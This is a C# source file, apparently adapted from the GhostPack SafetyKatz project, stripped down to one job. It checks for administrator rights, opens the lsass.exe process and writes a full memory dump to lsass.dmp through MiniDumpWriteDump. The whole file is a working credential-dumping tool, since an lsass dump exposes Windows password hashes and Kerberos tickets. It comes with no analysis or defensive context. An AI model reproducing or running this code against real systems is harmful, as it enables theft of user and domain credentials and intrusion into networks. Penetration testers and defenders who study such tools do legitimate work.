//Source:https://github.com/GhostPack/SafetyKatz
//Remove some functions of the source code,only used of dumping lsass.exe to the current path.

using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;

namespace DumpLsass
{
    class Program
    {
        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void Minidump()
        {
            IntPtr targetProcessHandle = IntPtr.Zero;
            uint targetProcessId = 0;

            Process targetProcess = null;

            Process[] processes = Process.GetProcessesByName("lsass");
            targetProcess = processes[0];

            try
            {
                targetProcessId = (uint)targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("\n[X] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
                return;
            }
            bool bRet = false;

            string dumpFile = "lsass.dmp";

            Console.WriteLine(String.Format("\n[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }

            // if successful
            if (bRet)
            {
                Console.WriteLine("[+] Dump successful!");
            }
            else
            {
                Console.WriteLine(String.Format("[X] Dump failed: {0}", bRet));
            }
        }
        static void Main(string[] args)
        {

            if (!IsHighIntegrity())
            {
                Console.WriteLine("\n[X] Not in high integrity, unable to grab a handle to lsass!\n");
            }
            else
            {
                Minidump();

            }
        }
    }
}



